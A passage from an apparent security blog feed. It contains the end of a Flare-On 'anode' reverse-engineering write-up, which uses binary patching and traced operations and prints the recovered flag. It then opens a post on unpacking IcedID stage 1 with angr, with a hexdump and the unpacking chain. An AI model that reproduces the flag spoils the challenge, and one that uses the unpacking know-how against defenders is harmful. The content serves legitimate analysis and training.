</span></span><span class="line"><span class="cl">        <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="p">}</span>   
</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>     
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">target</span> <span class="o">=</span> <span class="p">[</span><span class="mi">106</span><span class="p">,</span> <span class="mi">196</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">178</span><span class="p">,</span> <span class="mi">174</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">196</span><span class="p">,</span> <span class="mi">74</span><span class="p">,</span> <span class="mi">139</span><span class="p">,</span> <span class="mi">219</span><span class="p">,</span> <span class="mi">166</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">211</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">227</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">156</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">239</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">223</span><span class="p">,</span> <span class="mi">225</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">171</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">234</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">207</span><span class="p">,</span> <span class="mi">82</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">180</span><span class="p">,</span> <span class="mi">212</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">189</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">76</span><span class="p">];</span>     
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">b</span><span class="p">.</span><span class="nx">every</span><span class="p">((</span><span class="nx">x</span><span class="p">,</span><span class="nx">i</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">x</span> <span class="o">===</span> <span class="nx">target</span><span class="p">[</span><span class="nx">i</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Congrats!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Try again.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>     
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span></code></pre></div><p>We&rsquo;re just asked to enter a string of 44 characters, which is then processed by the state machine and finally compared byte by byte with the target array.</p>
<p>When i saw that state machine loop i initially thought it would be some sort of control flow flattening to break, but noticed none of the next state calculation actually depends on any condition, so
easy game: run with nodejs, dump state to get correct order and profit (or something like that).</p>
<p>However:</p>
<pre tabindex="0"><code>% node anode.js
Enter flag: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
uh-oh, math is too correct...
</code></pre><p>2 things here are complicating my initial statement:</p>
<ul>
<li>the state machine is not going to work properly when the state is &ldquo;random&rdquo;:</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">state</span> <span class="o">^=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">30</span><span class="p">));</span>
</span></span></code></pre></div><ul>
<li>there&rsquo;s some funky things happening with BigInt (comment is not lying):</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">  <span class="c1">// something strange is happening...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="mi">1</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;uh-oh, math is too correct...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p>soooo&hellip; that nexe bundle must be packed with a modified node.exe, like with a not so random random().</p>
<p>Looking at it in ghidra, finding <code>v8::base::RandomNumberGenerator::SetSeed</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="n">thiscall</span> <span class="n">v8</span><span class="o">::</span><span class="n">base</span><span class="o">::</span><span class="n">RandomNumberGenerator</span><span class="o">::</span><span class="nf">SetSeed</span><span class="p">(</span><span class="n">RandomNumberGenerator</span> <span class="o">*</span><span class="n">this</span><span class="p">,</span><span class="n">int64</span> <span class="n">param_1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* 0xd8dc60  11842  ?SetSeed@RandomNumberGenerator@base@v8@@QEAAX_J@Z */</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">this</span> <span class="o">=</span> <span class="n">param_1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">undefined8</span><span class="p">)(</span><span class="n">this</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x60c43c4809ad2d74</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">undefined8</span><span class="p">)(</span><span class="n">this</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0xce6a1a53db4c5403</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>We can see that it has indeed be patched to set the PRNG initial state to a fixed value, instead of anyting supplied to the SetSeed() function.</p>
<p>As compared to the original: <a href="https://chromium.googlesource.com/v8/v8/+/6d706ae3a0153cf0272760132b775ae06ef13b1a/src/base/utils/random-number-generator.cc#207">https://chromium.googlesource.com/v8/v8/+/6d706ae3a0153cf0272760132b775ae06ef13b1a/src/base/utils/random-number-generator.cc#207</a></p>
<p>Lot of crazy ideas going into my head at this time, like reimplementing the PRNG and/or dumping all its (firsts) values, etc&hellip;</p>
<p>But all of these would also require to dig more into the patched node.exe and also find out what has been done to BigInt as well, nothing i wanted to do at the moment&hellip;</p>
<p>Since the script&rsquo;s logic is only valid when ran with the patched node.exe, if i wanted to debug the js, i needed a way to have a modified script executed by this binary.</p>
<p>Turned out, you can edit the script straight inside the binary and you don&rsquo;t have to change anything else as long as its size doesn&rsquo;t change.</p>
<p>Handy, and now, time to cringe&hellip;</p>
<p>In the extracted script, let&rsquo;s change this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">  <span class="c1">// something strange is happening...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="mi">1</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;uh-oh, math is too correct...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p>by</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">  <span class="c1">// happening.....
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">l</span> <span class="o">=</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="mi">1</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;uh-oh, math is too correct...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p>so we can use <code>l()</code> instead of <code>console.log()</code>: that should fit fine in all the useless whitespaces (aka indentations).</p>
<p>Then use a stupid script make the JS print all operation:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fix_line</span><span class="p">(</span><span class="n">line</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">ori_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">expr</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s2">&#34;^ +(.*?);$&#34;</span><span class="p">,</span> <span class="n">line</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">new_line</span> <span class="o">=</span> <span class="s1">&#39;l(&#34;</span><span class="si">%s</span><span class="s1">&#34;);&#39;</span><span class="o">%</span><span class="n">expr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">new_line</span> <span class="o">=</span> <span class="n">new_line</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;Math.floor(Math.random() * 256)&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                <span class="s1">&#39;&#34;+Math.floor(Math.random() * 256)+&#34;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">n_space</span> <span class="o">=</span> <span class="n">ori_len</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">new_line</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="n">new_line</span> <span class="o">=</span> <span class="s1">&#39; &#39;</span><span class="o">*</span><span class="n">n_space</span> <span class="o">+</span> <span class="n">new_line</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">new_line</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;patched_anode.tmpl&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">fp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="s2">&#34;^ +b\[&#34;</span><span class="p">,</span> <span class="n">line</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">fix_line</span><span class="p">(</span><span class="n">line</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span></code></pre></div><p>the result looks like:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">state</span> <span class="o">^=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">30</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="nx">state</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">306211</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">&lt;</span> <span class="mf">0.5</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="nx">l</span><span class="p">(</span><span class="s2">&#34;b[30] -= b[34] + b[23] + b[5] + b[37] + b[33] + b[12] + &#34;</span><span class="o">+</span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">256</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">     <span class="nx">l</span><span class="p">(</span><span class="s2">&#34;b[30] &amp;= 0xFF&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="nx">l</span><span class="p">(</span><span class="s2">&#34;b[26] -= b[24] + b[41] + b[13] + b[43] + b[6] + b[30] + 225&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">     <span class="nx">l</span><span class="p">(</span><span class="s2">&#34;b[26] &amp;= 0xFF&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nx">state</span> <span class="o">=</span> <span class="mi">868071080</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">311489</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">&lt;</span> <span class="mf">0.5</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="nx">l</span><span class="p">(</span><span class="s2">&#34;b[10] -= b[32] + b[1] + b[20] + b[30] + b[23] + b[9] + 115&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">     <span class="nx">l</span><span class="p">(</span><span class="s2">&#34;b[10] &amp;= 0xFF&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="nx">l</span><span class="p">(</span><span class="s2">&#34;b[7] ^= (b[18] + b[14] + b[11] + b[25] + b[31] + b[21] + 19) &amp; 0xFF&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nx">state</span> <span class="o">=</span> <span class="mi">22167546</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="p">;</span>
</span></span></code></pre></div><p>and should have the same size than the original script:</p>
<pre tabindex="0"><code>% ls -l inj.js patched_anode.tmpl
316 -rw-r--r-- 1 matth matth 321847 Oct  3 09:19 inj.js
316 -rw-r--r-- 1 matth matth 321847 Oct  3 09:09 patched_anode.tmpl
</code></pre><p>we can then push it back into the binary using advanced parasite code injection (sic):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;anode.exe&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">header</span> <span class="o">=</span> <span class="n">fp</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mh">0x35e3806</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">fp</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="mh">0x363213d</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">footer</span> <span class="o">=</span> <span class="n">fp</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">patch</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;ppp_anode.exe&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">header</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">patch</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">footer</span><span class="p">)</span>
</span></span></code></pre></div><p>We get a new binary <code>ppp_anode.exe</code>, which when executed produces a trace like:</p>
<pre tabindex="0"><code>% head -20 conds.txt
b[29] -= b[37] + b[23] + b[22] + b[24] + b[26] + b[10] + 7
b[29] &amp;= 0xFF
b[39] += b[34] + b[2] + b[1] + b[43] + b[20] + b[9] + 79
b[39] &amp;= 0xFF
b[19] ^= (b[26] + b[0] + b[40] + b[37] + b[23] + b[32] + 255) &amp; 0xFF
b[28] ^= (b[1] + b[23] + b[37] + b[31] + b[43] + b[42] + 245) &amp; 0xFF
b[39] += b[42] + b[10] + b[3] + b[41] + b[14] + b[26] + 177
b[39] &amp;= 0xFF
b[9] -= b[20] + b[19] + b[22] + b[5] + b[32] + b[35] + 151
b[9] &amp;= 0xFF
b[14] -= b[4] + b[5] + b[31] + b[15] + b[36] + b[40] + 67
b[14] &amp;= 0xFF
b[33] += b[25] + b[12] + b[14] + b[34] + b[4] + b[36] + 185
b[33] &amp;= 0xFF
b[12] -= b[21] + b[23] + b[0] + b[32] + b[28] + b[17] + 252
b[12] &amp;= 0xFF
b[43] += b[10] + b[15] + b[28] + b[29] + b[27] + b[26] + 168
b[43] &amp;= 0xFF
b[18] ^= (b[32] + b[30] + b[26] + b[22] + b[9] + b[33] + 19) &amp; 0xFF
b[8] += b[18] + b[41] + b[1] + b[3] + b[16] + b[43] + 139
</code></pre><p>so we know what have to solve, the issue is there&rsquo;s a lot of operations:</p>
<pre tabindex="0"><code>% wc -l conds.txt
1704 conds.txt
</code></pre><p>Despites hearing several people claiming z3 wont work on this, i convinced myself i was smarter (spoiler alert, i&rsquo;m not) and squeezed everything into z3 and went for lunch or something.</p>
<p>It kept running and running until i got bored and convinced myself to change the approach and try something which was too dumb to be true: just execute from the bottom up, switching + and - operations&hellip;</p>
<p>warning: what follows can hurt the eyes :)</p>
<ul>
<li>reverse all lines and switch additions and substractions:</li>
</ul>
<pre tabindex="0"><code>%  cat conds.txt | tac | sed -e &#39;s/+=/@=/&#39; -e &#39;s/-=/+=/&#39; -e &#39;s/@=/-=/&#39; &gt; rev.txt
</code></pre><ul>
<li>execute with a small wrapper:</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">claripy</span> <span class="kn">import</span> <span class="n">BVV</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># from js</span>
</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="p">[</span><span class="mi">106</span><span class="p">,</span> <span class="mi">196</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">178</span><span class="p">,</span> <span class="mi">174</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">196</span><span class="p">,</span> <span class="mi">74</span><span class="p">,</span> <span class="mi">139</span><span class="p">,</span> <span class="mi">219</span><span class="p">,</span> <span class="mi">166</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">211</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">227</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">156</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">239</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">223</span><span class="p">,</span> <span class="mi">225</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">171</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">234</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">207</span><span class="p">,</span> <span class="mi">82</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">180</span><span class="p">,</span> <span class="mi">212</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">189</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">76</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># keep it on 8 bits the lazy way...</span>
</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="p">[</span><span class="n">BVV</span><span class="p">(</span><span class="n">_</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">target</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># more advanced stuff... :)</span>
</span></span><span class="line"><span class="cl"><span class="n">exec</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;rev.txt&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># result of heavy calculations</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span></span></code></pre></div><ul>
<li>get byte values (too lazy to find out how to convert claripy BVV to actual int):</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">% python exe.py <span class="p">|</span> sed -e <span class="s1">&#39;s/&lt;BV8//g&#39;</span> -e <span class="s1">&#39;s/&gt;//g&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span> 110,  48,  116,  95,  106,  117,  53,  116,  95,  65,  95,  106,  52,  118,  97,  83,  67,  114,  105,  80,  55,  95,  99,  104,  52,  108,  49,  101,  110,  103,  51,  64,  102,  108,  97,  114,  101,  45,  111,  110,  46,  99,  111,  109<span class="o">]</span>
</span></span></code></pre></div><ul>
<li>profit:</li>
</ul>
<pre tabindex="0"><code>% python
Python 3.10.8 (main, Nov  4 2022, 09:21:25) [GCC 12.2.0] on linux
Type &#34;help&#34;, &#34;copyright&#34;, &#34;credits&#34; or &#34;license&#34; for more information.
&gt;&gt;&gt; lolz = [ 110,  48,  116,  95,  106,  117,  53,  116,  95,  65,  95,  106,  52,  118,  97,  83,  67,  114,  105,  80,  55,  95,  99,  104,  52,  108,  49,  101,  110,  103,  51,  64,  102,  108,  97,  114,  101,  45,  111,  110,  46,  99,  111,  109]
&gt;&gt;&gt; &#39;&#39;.join([chr(_) for _ in lolz])
&#39;n0t_ju5t_A_j4vaSCriP7_ch4l1eng3@flare-on.com&#39;
</code></pre><h1 id="8-backdoor">8. backdoor</h1>
<p>(might open soon ?)</p>
<h1 id="9-encryptor">9. encryptor</h1>
<p>(am i losing my time ?)</p>
<h1 id="10-nur-getraumt">10. Nur getraumt</h1>
<p>(99 luftballon)</p>
<h1 id="11-the-challenge-that-shall-not-be-named">11. The challenge that shall not be named</h1>
<p>(do i need a shrubbery ?)</p>
]]></content>
		</item>
		
		<item>
			<title>Automatically Unpacking IcedID Stage 1 with angr</title>
			<link>https://matth.dmz42.org/posts/2022/automatically-unpacking-icedid-stage1-with-angr/</link>
			<pubDate>Mon, 30 May 2022 09:15:00 +0200</pubDate>
			
			<guid>https://matth.dmz42.org/posts/2022/automatically-unpacking-icedid-stage1-with-angr/</guid>
			<description>It started with 0verfl0w posting a small challenge on the Zero 2 Automated discord server asking to automatically extract the configuration of an unpacked IcedID sample (0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7).
Unpacking the sample was part of the exercise but could be done manually as a one shot, however the more I looked into the stager, the more i thought an automated unpacker would be a fun thing to do.
I&amp;rsquo;ll skip over some details of the stager (like API hashing and injection) to focus only on the unpacking part.</description>
			<content type="html"><![CDATA[<p>It started with <a href="https://twitter.com/0verfl0w_">0verfl0w</a> posting a small challenge on the <a href="https://courses.zero2auto.com/">Zero 2 Automated</a> discord server asking to automatically extract the
configuration of an unpacked IcedID sample (<a href="https://bazaar.abuse.ch/sample/0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7/">0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7</a>).</p>
<p>Unpacking the sample was part of the exercise but could be done manually as a one shot, however the more I looked into the stager, the more i thought an automated unpacker would be a fun thing
to do.</p>
<p>I&rsquo;ll skip over some details of the stager (like API hashing and injection) to focus only on the unpacking part.</p>
<p><em>TL;DR: full code is available here: <a href="https://github.com/matthw/icedid_stage1_unpack">https://github.com/matthw/icedid_stage1_unpack</a>.</em></p>
<p><strong>EDIT:</strong> it unpacks samples packed with <a href="https://bazaar.abuse.ch/browse.php?search=yara%3ASPLCrypt">SPLCrypt</a>, including BazarLoader.</p>
<h1 id="1-structure-and-flow">1. Structure and Flow</h1>
<p>The packed data are really easy to identify: there&rsquo;s a huge hex string in the data section, and by hex string i a mean littleral string of [0-9a-f] characters.</p>
<pre tabindex="0"><code>[...]
000af670  33 62 36 64 34 39 61 61  36 35 33 36 31 34 64 65  |3b6d49aa653614de|
000af680  33 31 62 32 66 64 37 31  65 64 38 66 61 30 37 63  |31b2fd71ed8fa07c|
000af690  63 34 30 39 64 64 34 38  61 65 36 35 38 39 31 61  |c409dd48ae65891a|
000af6a0  63 36 33 61 30 39 39 36  31 38 61 63 38 35 30 33  |c63a099618ac8503|
000af6b0  62 34 32 37 39 31 36 63  66 36 31 66 31 31 33 30  |b427916cf61f1130|
000af6c0  37 66 35 39 30 35 33 31  65 37 37 39 35 34 31 33  |7f590531e7795413|
000af6d0  63 64 31 62 32 30 00 00  00 00 00 00 00 00 00 00  |cd1b20..........|
</code></pre><p>The unpacking process is as follow:</p>
<pre tabindex="0"><code>             ┌────────────┐
             │            │
             │ Hex Decode │
             │            │
             └─────┬──────┘
                   │
                   │
             ┌─────▼──────┐
             │            │
       ┌─────┤    RC4     │
       │     │            │
       │     └─────┬──────┘
       │           │
       │           │
┌──────▼─────┐     │
│            │     │
│     XOR    │     │
│ (optionnal)│     │
│            │     │
└─────┬──────┘     │
      │            │
      │            │
      │      ┌─────▼──────┐
      │      │            │
      └──────►  QuickLZ   │
             │(decompress)│
             │            │
             └─────┬──────┘
                   │
                   │
             ┌─────▼──────┐
             │            │
             │   Split    │
             │            │
             └────────────┘
</code></pre><p>The control flow at assembly level is very obfuscated, so the decompiler comes handy even if it doesn&rsquo;t produces perfect results.</p>
<p><img src="obfuscated_flow.png" alt="Obfuscated control flow"></p>
